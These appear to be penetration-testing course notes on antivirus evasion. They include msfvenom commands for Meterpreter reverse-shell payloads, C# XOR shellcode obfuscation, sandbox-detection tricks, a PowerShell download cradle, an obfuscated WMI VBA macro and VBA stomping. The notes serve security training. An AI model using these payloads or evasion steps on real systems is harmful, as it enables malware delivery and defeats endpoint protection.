![[Pasted image 20240604004942.png]]

# 6.1 Overview
## 6.1.1 Antivirus Software Overview

#### **Antivirus Software Evolution and Evasion Techniques**

Antivirus software has undergone significant advancements over the past two decades. Initially, these tools relied on simple, often ineffective detection mechanisms. However, to combat the complexity of modern malware, they now incorporate sophisticated technologies.

#### **Endpoint Deployment and Functionalities**

Typically, antivirus software operates on endpoint devices, allowing users to initiate on-demand scans of files or benefit from real-time scanning. This latter feature actively monitors file operations, scanning files upon download or execution attempts. Detected threats are promptly deleted or quarantined.

#### **Detection Techniques**

1. **Signature-Based Detection**:
    - Traditionally, antivirus solutions rely heavily on signatures—unique identifiers for malware, often based on MD5 or SHA-1 hashes of malicious files or specific byte sequences. These signatures are developed through automated systems and manual reverse engineering, stored in extensive databases. A match with these signatures during a scan flags a file as malicious.
2. **Heuristic and Behavioral Analysis**:
    - Advanced solutions employ heuristics or simulate file execution to spot malicious behaviors. Typically, this involves executing the file within a controlled, sandbox environment to identify harmful actions. This method, though more resource-intensive, offers a deeper level of inspection compared to signature-based detection.
3. **AI-Enhanced Heuristic Detection**:
    - Leveraging cloud computing and AI, some modern antivirus systems enhance detection capabilities to deliver faster and more accurate results. Despite higher costs and less frequent implementation, this method is gaining traction for its improved efficiency and accuracy.



In this section, we'll focus on evading ClamAV and Avira — two antivirus solutions that, despite their FREE availability, employ both signature and heuristic detection techniques. Additionally, we'll utilize online platforms to test and refine our evasion strategies against various antivirus products.

#### **Evasion Techniques**

We will explore methods to bypass both signature-based and heuristic-based defenses, incorporating the latest techniques in polymorphism, encryption, and obfuscation to evade detection. By understanding and exploiting the limitations of current antivirus methodologies, we can develop more robust security measures and evasion tactics.

## 6.1.2 Simulating the Target Environment

Test whether the toolkits + payloads work in real environments. To do this, the attacker needs to create an environment simulation

## 6.1.3 Locating Signatures in Files

References & credit:
- https://obscuresecurity.blogspot.com/2012/12/finding-simple-av-signatures-with.html
- PowerShellMafia -> PowershellSploit -> [Find-AVSignature](https://github.com/PowerShellMafia/PowerSploit/blob/d943001a7defb5e0d1657085a77a0e78609be58f/docs/AntivirusBypass/Find-AVSignature.md)

Tools: [Find-AVSignature.ps1](https://raw.githubusercontent.com/col-1002/OSEP-Course/main/Attachment/Find-AVSignature.ps1)

Free Antivirus Software to detect malware: ClamAV
- https://en.wikipedia.org/wiki/ClamAV
- https://docs.clamav.net/Introduction.html
- https://github.com/Cisco-Talos/clamav

Using Find-AVSignature to find the byte gets caught by Antivirus Software. Then modify that byte, and re-check using *ClamAV*.

This approach may have worked a decade or so ago, but it doesn't now. Therefore, the next approach is to encode or encrypt the offending code.

# 6.2 Metasploit Encoder & Encrytor
## 6.2.1 Metasploit Encoders

List the available encoders: `msfvenom --list encoders`

```
Framework Encoders [--encoder <value>]
======================================

    Name                          Rank       Description
    ----                          ----       -----------
    cmd/brace                     low        Bash Brace Expansion Command Encoder
    cmd/echo                      good       Echo Command Encoder
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder
    cmd/perl                      normal     Perl Command Encoder
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
    generic/eicar                 manual     The EICAR Encoder
    generic/none                  normal     The "none" Encoder
    mipsbe/byte_xori              normal     Byte XORi Encoder
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder
    ppc/longxor                   normal     PPC LongXOR Encoder
    ppc/longxor_tag               normal     PPC LongXOR Encoder
    ruby/base64                   great      Ruby Base64 Encoder
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
    x64/xor                       normal     XOR Encoder
    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder
    x64/xor_dynamic               normal     Dynamic key XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/bmp_polyglot              manual     BMP Polyglot
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder (optimised)
    x86/service                   manual     Register Service
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
    x86/xor_dynamic               normal     Dynamic key XOR Encoder
    x86/xor_poly                  normal     XOR POLY Encoder
```

For e.g: The [x86/shikata_ga_nai](https://danielsauder.com/2015/08/26/an-analysis-of-shikata-ga-nai/) encoder is a commonly-used polymorphic encoder that produces different outputs each time it is run, making it effective for signature evasion. Work under x32 systems

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=10.0.1.123 LPORT=443 -e x86/shikata_ga_nai -f exe -o payload32.exe
```

[x64/zutto_dekiru](https://www.infosecmatter.com/metasploit-module-library/?mm=encoder/x64/zutto_dekiru)  Inspired by "shikata_ga_nai" using "fxsave64" to work under x64 systems.

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.1.123 LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o payload64_notepad.exe
```

Metasploit encoders are no longer widely effective for bypassing antivirus 

## 6.2.2 Metasploit Encryptors

Rapid7, the developers of Metasploit, launched updated options for encryption in 2018, which were designed to address the growing ineffectiveness of encoders for antivirus evasion.

```bash
# msfvenom --list encrypt
Framework Encryption Formats [--encrypt <value>]
================================================

    Name
    ----
    aes256
    base64
    rc4
    xor
```

For e.g: Generate an executable with AES256 encrypted shellcode and use a custom encryption key through the `--encrypt-key` option

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.1.123 LPORT=443 --encrypt aes256 --encrypt-key ENCRYPT_KEY -f exe -o payload64_aes.exe
```

[Hiding Metasploit Shellcode to Evade Windows Defender | Rapid7 Blog](https://www.rapid7.com/blog/post/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/)

Security researchers have pointed out that Metasploit encryption will not effectively overcome security solutions if decoding or decryption techniques are static because they will be interpreted and signatures will be written.

# 6.3 Bypassing Antivirus with C`#`
## 6.3.1 C# Shellcode Runner vs Antivirus

Compile the C# shellcode runner from module 3 + module 4.

Check it with Antivirus engines. Observe that these shellcodes can bypass some basic anti-virus software (Avira and ClamAV), BUT some more powerful software still detects them.

The most commonly-used technique of bypassing antivirus is to **obfuscate** the embedded shellcode.

## 6.3.2 Encrypting the C# Shellcode Runner

References & credit:
- [Caesar Cipher in Cryptography - GeeksforGeeks](https://www.geeksforgeeks.org/caesar-cipher-in-cryptography/)
- [Exclusive OR - Wikipedia](https://en.wikipedia.org/wiki/Exclusive_or)
- [Bitwise XOR Operator in Programming - GeeksforGeeks](https://www.geeksforgeeks.org/bitwise-xor-operator-in-programming/#bitwise-xor-operator-in-c#)

This technique will bypassing signature detection

#### Basic_Caesar_Cipher

```cs
namespace Basic_Caesar_Cipher 
{ 
    public class Program 
	{ 
		static void Main(string[] args) 
		{ 
			byte[] buf = new byte[752] { 0xfc,0x48,0x83,0xe4,0xf0... }
			
			// Encrypt
			byte[] encoded = new byte[buf.Length]; 
			for(int i = 0; i < buf.Length; i++) 
			{ 
				encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF); 
			}
			
			// Decrypt
			byte[] buf_encrypt = new byte[752] {0xfe, 0x4a, 0x85, 0xe6, 0xf2... }
			for(int i = 0; i < buf_encrypt.Length; i++)
			{ 
				buf_encrypt[i] = (byte)(((uint)buf_encrypt[i] - 2) & 0xFF);
			}
		}
	}
}
```

#### Basic_XOR_Cipher

Bitwise syntax XOR operator in C#

```cs
// Encrypt the payload with XOR (fixed key: 0xfa -> Decimal: 250)
byte[] encoded = new byte[buf.Length];
for (int i = 0; i < buf.Length; i++)
{
    encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
}

// Decrypt
for (int i = 0; i < buf.Length; i++)
{
    buf[i] = (byte)((uint)buf[i] ^ 0xfa);
}
```

The next section is bypassing heuristics detection

# 6.4 Messing with the behavior
## 6.4.1 Time Delays: A Legacy Technique

While "time delays" are a classic method for potentially bypassing behavior analysis, their effectiveness might be waning in the face of modern emulation techniques (circa 2024). Here's a look at this approach and some considerations for its continued use:
- **Win32 `Sleep` API:** The `Sleep` function offers a basic mechanism to introduce delays. However, emulators might now account for predictable sleep durations.
- **Dynamic Delays:** To counter this, consider implementing dynamic delays. Utilize a random number generator to determine the sleep duration within a reasonable range. This unpredictability can make it trickier for emulators to fast-forward accurately.

Basic C# to detect time lapse.

```cs
[DllImport("kernel32.dll")] 
static extern void Sleep(uint dwMilliseconds); 

static void Main(string[] args)

{ 
    DateTime t1 = DateTime.Now; // fetch the local computer’s current date and time
    Sleep(5000); 
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;  
    if(t2 < 4.5) 
    { 
		return; 
    } 
... 
```

To determine the elapsed time, we use the `Subtract` method and convert this into seconds with the `TotalSeconds` property. Next, we try to determine if the `Sleep` call has been emulated by inspecting the time lapse. In this case, we are testing for a lapse of 4.5 seconds to allow for inaccuracies in the time measurement. If the time lapse is less than 4.5 seconds, we can assume the call was emulated and simply exit instead of executing shellcode.

## 6.4.2 Non-emulated APIs

Antivirus emulator engines only simulate the execution of most common executable file formats and functions -> attempt to bypass detection using Win32 API that is either incorrectly emulated.

In general, there are two ways of locating non-emulated APIs
- Reverse engineer the antivirus emulator -> highly complex
- Test out various Win32 API agains the Antivirus engine.

In this section, the Non-emulated API are **VirtualAllocExNuma** and **FlsAlloc**, We are already using this Win32 API from [5.1.2 Process Injection in C#](https://github.com/col-1002/OSEP-Course/blob/main/Modules/Module%205.%20Process%20injection%20and%20migration.md#512-process-injection-in-c)

### VirtualAllocExNuma

[VirtualAllocExNuma](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocexnuma) function Reserves, commits, or changes the state of a region of memory within the virtual address space of the specified process, and specifies the NUMA node for the physical memory.

```cs
[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(
		IntPtr hProcess, 
		IntPtr lpAddress, 
		uint dwSize, 
		UInt32 flAllocationType, 
		UInt32 flProtect, 
		UInt32 nndPreferred
);

	IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
	// If the Win API is not emulated and the AV emulator runs the code, it will not return a valid address.
	if (mem == null) { return; }

	// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.123 LPORT=443 -f csharp
	byte[] buf = new byte[511] { SHELLCODE_GO_HERE };

	int len = buf.Length;
	uint uLen = (uint)len;
```

- **`hProcess`**: A handle to the process in which memory will be allocated. Use of `GetCurrentProcess()` in the function call suggests that memory is being allocated in the address space of the current process.
- **`lpAddress`**: The desired starting address of the allocated memory. When set to `IntPtr.Zero`, the system determines where to allocate the memory.
- **`dwSize`**: The size of the memory region to allocate, in bytes. In this case, `0x1000` or 4096 bytes.
- **`flAllocationType`**: The type of memory allocation. `0x3000` corresponds to `MEM_COMMIT | MEM_RESERVE`, indicating that memory is both reserved and committed.
- **`flProtect`**: The memory protection desired for the allocated region. `0x4` corresponds to `PAGE_READWRITE`, allowing read and write access to the allocated memory.
- **`nndPreferred`**: The preferred NUMA node for the memory allocation. Setting this to `0` specifies that the memory should be allocated from the closest available NUMA node.

### FlsAlloc

Use the Win32 FlsAlloc API to create a heuristics detection bypass. [FlsAlloc function - Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/fibersapi/nf-fibersapi-flsalloc)

```cs
[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
public static extern IntPtr FlsAlloc([In] IntPtr lpCallback); // Assuming a callback function is needed

// ... your code using FlsAlloc
IntPtr allocRes = FlsAlloc(0)
if (allocRes == null) { return; }
```

# 6.5 Antivirus Evasion in MS Office - VBA macros
## 6.5.1 Basic bypass Antivirus in VBA

Using the code from [3.4.2 VBA Shellcode Runner](https://github.com/col-1002/OSEP-Course/blob/main/Modules/Module%203.%20Client%20Side%20Code%20Execution%20With%20Office.md#final-code-snippets---mymacro). But this time, shellcode will be encrypt using XOR with key.

Use the code snippet from this section: 6.3 Bypassing Antivirus with C#

But this time, when XOR decrypting, take **Decimal** values instead of **Hexadecimal**

```cs
uint counter = 0;

StringBuilder hex = new StringBuilder(encoded.Length * 2);
foreach (byte b in encoded)
{
    hex.AppendFormat("{0:D3}, ", b);
    counter++;
    if (counter % 25 == 0)
    {
        hex.Append("_\n");
    }
}
Console.WriteLine($"XORed VBA payload (key: 0xfa):");
Console.WriteLine(hex.ToString());
```

## 6.5.2 VBA Stomp

References & Credit :
- https://www.youtube.com/watch?v=9ULzZA70Dzg
- https://github.com/outflanknl/EvilClippy
- https://vbastomp.com/

Advanced Malicious Document Technique. Order of reading articles:
1. [MS Office File Formats](https://medium.com/walmartglobaltech/ms-office-file-formats-advanced-malicious-document-maldoc-techniques-b5f948950fdf)
2. [Evasive VBA](https://medium.com/walmartglobaltech/evasive-vba-advanced-maldoc-techniques-1365e9373f80)

This document describes the elements in Download Powershell that are susceptible to being flagged by AV -> Base64 Encode + Concat string, ...
Equivalent section: Detection of PowerShell Shellcode Runner

Consider again the code from Module 3 that used PowerShell without encryption

```powershell
# 'Net.WebClient' Class in .NET framework
(New-Object System.Net.WebClient).DownloadFile('http://IP/staged_shell.exe','C:\Windows\Temp\staged_shell.exe')

# Base64 Encoding in PowerShell
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Powershell_Command"))

# Using this command to execute remote PowerShell command
powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc BASE64_ENCODING
```

One method is to call **cmd.exe /c powershell.exe** instead of calling **powershell.exe** directly. For e.g

```
C:\Users\Admin>cmd.exe /c powershell.exe "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8AL ... AGUAeABlACcA"
```

The other method is obfuscate every possible part of the VBA

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*4MXez2F-8PvJdhaYwFbSkQ.png)

Equivalent section 6.6.2 Dechaining with WMI + 6.6.3 Obfuscating VBA. Là thay thế hàm thực thi `Shell, $Shell` bằng WMI và obfuscate

```vb
Function randomnam6789(cows)
	randomnam6789 = StrReverse(cows)
End Function

Sub Mymacro()
	Dim strArg As String
	strArg = randomnam6789(" POWERSHELL_ENCODE REVERSED STRINGS ")
	GetObject(randomnam6789(":stmgmniw")).Get(randomnam6789("ssecorP_23niW")).Create strArg, Null, Null, pid
End Sub
```

3. [VBA Stomping](https://medium.com/walmartglobaltech/vba-stomping-advanced-maldoc-techniques-612c484ab278) 


VBA Stomping is a powerful malicious document generation techniques bypassing anti-virus detection. VBA stomping refers to destroying the VBA source code in a MS Office document, leaving only a compiled version of the macro code known as p-code in the document file. 

**A VBA stomped maldoc can only be executed using the same VBA version used to create the document**

![](https://raw.githubusercontent.com/col-1002/OSEP-Course/main/Attachment/MS_Office_File_Format_v1.png)

Open the file `vbaProject.bin` with a hex editor, modifying the VBA source code, overwriting it with zero 

There are a tool to automate VBA stomping

#### Automation

```powershell
.\EvilClippy.exe -s fake_code.vbs -g -r basic_shellcode_in_VBA.docm
```

#### Detection

[VBA Seismograph](https://github.com/kirk-sayre-work/VBASeismograph) is a tool for detecting VBA stomping.


# Conclusion & TODO

Antivirus Software Overview

**Heuristic and Behavioral Analysis (Dynamic analysis)**: Time Delays (a Legacy Technique) + Non-emulated APIs (FlsAlloc, VirtualAllocExNuma)

**Signature-Based Detection (static analysis)**: Obfuscating + VBA Stomp

Metasploit Encoder & Encrytor: This method is no longer effective because the antivirus software vendor has upgraded the signature database

In summary, if you want your shellcode in VBA / C#  to be detected less:
- Avoid using code directly from attack simulation frameworks
- Use non-standard encryption or encoding for the payload that will be visible during static analysis
- Stub out functions you need but don’t want to look suspicious (Chr(), etc.)


.